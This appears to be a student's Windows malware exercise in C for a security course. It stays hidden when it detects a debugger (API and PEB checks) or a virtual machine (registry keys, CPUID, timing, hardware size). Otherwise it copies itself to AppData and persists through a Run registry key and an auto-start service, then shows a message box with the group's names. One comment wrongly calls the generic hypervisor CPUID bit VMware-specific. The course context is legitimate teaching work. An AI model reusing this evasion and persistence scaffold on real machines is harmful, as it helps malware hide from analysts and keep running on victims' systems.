#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <shlobj.h>
#include <intrin.h>
#include <psapi.h>
#pragma comment(lib, "shell32.lib")

// --- PHÁT HIỆN DEBUGGER (ANTI-DEBUGGING) ---
// Phương thức 1: Sử dụng Windows API
int checkAPI() {
    return IsDebuggerPresent();
}

// Phương thức 2: Low-level PEB Check (x64) 
int checkPEB() {
    // Đọc cờ BeingDebugged trực tiếp từ Process Environment Block
    BOOL beingDebugged = FALSE;
    #ifdef _WIN64
        unsigned long long peb = __readgsqword(0x60);
        beingDebugged = *(unsigned char*)(peb + 2);
    #else
        unsigned long peb = __readfsdword(0x30);
        beingDebugged = *(unsigned char*)(peb + 2);
    #endif
    return beingDebugged;
}

// --- PHÁT HIỆN MÁY ẢO (ANTI-VM) ---
// Phương thức 1: Artifact-based detection (Registry keys, files, processes)
int checkVMArtifact() {
    HKEY hKey;
    char value[256];
    DWORD size = sizeof(value);
    
    // Kiểm tra registry của VMware
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return 1; // Phát hiện VMware
    }
    
    // Kiểm tra registry của VirtualBox
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Oracle\\VirtualBox Guest Additions", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return 1; // Phát hiện VirtualBox
    }
    
    // Check Hyper-V registry
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Hyper-V", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return 1; // Phát hiện Hyper-V
    }
    
    // Kiểm tra process của VirtualBox
    if (FindWindowA("VBoxTrayToolWndClass", NULL) != NULL) {
        return 1; // Phát hiện VirtualBox qua process window
    }
    
    // Kiểm tra CPUID của VMware (VMware magic number)
    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 1);
    if ((cpuInfo[2] & 0x80000000) != 0) { // VMware specific bit
        return 1; // Phát hiện VMware qua CPUID
    }
    
    return 0; // No VM detected
}

// Phương thức 2: Behavior/Timing-based detection (Instruction timing, disk size)
int checkVMBehavior() {
    // Kiểm tra kích thước đĩa (VMs thường có đĩa nhỏ)
    ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes;
    if (GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable, &totalNumberOfBytes, &totalNumberOfFreeBytes)) {
        // Nếu kích thước đĩa < 50GB, có thể là VM
        if (totalNumberOfBytes.QuadPart < 50LL * 1024 * 1024 * 1024) {
            return 1;
        }
    }
    
    // Kiểm tra thời gian thực thi của một đoạn mã CPU-intensive
    // (VMs thường chậm hơn)
    LARGE_INTEGER start, end, freq;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    
    // Thực thi một đoạn mã CPU-intensive (ví dụ: vòng lặp lớn)
    volatile int sum = 0;
    for (int i = 0; i < 1000000; i++) {
        sum += i;
    }
    
    QueryPerformanceCounter(&end);
    double timeTaken = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
    
    // Nếu thời gian thực thi quá ngắn hoặc quá dài, có thể là dấu hiệu của VM
    // (Do overhead hoặc tối ưu hóa)
    if (timeTaken < 0.001 || timeTaken > 0.1) { // Điều chỉnh ngưỡng theo thực nghiệm
        return 1; 
    }
    
    // Dấu vết trên phần cứng 
    // Kiểm tra phần cứng có ít lõi hoặc RAM thấp (cấu hình phổ biến của VM)
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) { // VMs thường có ít lõi CPU
        return 1;
    }
    
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    if (memInfo.ullTotalPhys < 2LL * 1024 * 1024 * 1024) { // VMs thường có RAM thấp
        return 1;
    }
    
    return 0;
}

// --- PAYLOAD VÀ PERSISTENCE ---
void runPayload() {
    // Hiển thị thông tin nhóm để xác nhận payload đã chạy thành công
    MessageBoxA(NULL, 
        "22520810 - Huynh Bao Long, 22520432 - Do Dang Hieu, 23520860 - Nguyen Quang Loc", 
        "Nhom 10 - NT230.Q22", 
        MB_OK | MB_ICONINFORMATION);
}

void setupPersistence() {
    char szPath[MAX_PATH];
    char szAppDataPath[MAX_PATH];
    
    // Lấy đường dẫn hiện tại của executable
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    
    // Sao chép tệp vào AppData để đảm bảo persistence
    GetEnvironmentVariableA("APPDATA", szAppDataPath, MAX_PATH);
    strcat_s(szAppDataPath, MAX_PATH, "\\Nhom10\\");
    CreateDirectoryA(szAppDataPath, NULL);
    strcat_s(szAppDataPath, MAX_PATH, "Nhom10.exe");
    
    if (!CopyFileA(szPath, szAppDataPath, FALSE)) {
        strcpy_s(szAppDataPath, MAX_PATH, szPath);  // Nếu copy fail, dùng path cũ
    }

    // Registry Persistence - Chạy tại startup
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "Nhom10Popup", 0, REG_SZ, (const BYTE*)szAppDataPath, strlen(szAppDataPath) + 1);
        RegCloseKey(hKey);
    }

    // Startup Folder Persistence (không cần admin)
    char szStartup[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, szStartup) == S_OK) {
        strcat_s(szStartup, MAX_PATH, "\\Nhom10.lnk");
        // Có thể tạo shortcut ở đây nếu cần
    }

    // Service Persistence (Yêu cầu quyền Admin)
    SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (schSCManager) {
        SC_HANDLE schService = CreateServiceA(
            schSCManager, "Nhom10Service", "Nhom 10 Background Helper",
            SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
            szAppDataPath, NULL, NULL, NULL, NULL, NULL);
        if (schService) CloseServiceHandle(schService);
        CloseServiceHandle(schSCManager);
    }
}

int main() {
    // Kiểm tra Debugger
    if (checkAPI() || checkPEB()) {
        return 0;
    }

    // Kiểm tra Máy ảo
    if (checkVMArtifact() || checkVMBehavior()) {
        return 0;
    }

    // Nếu môi trường sạch - Thực hiện Payload và bám rễ
    setupPersistence();
    runPayload();

    return 0;
}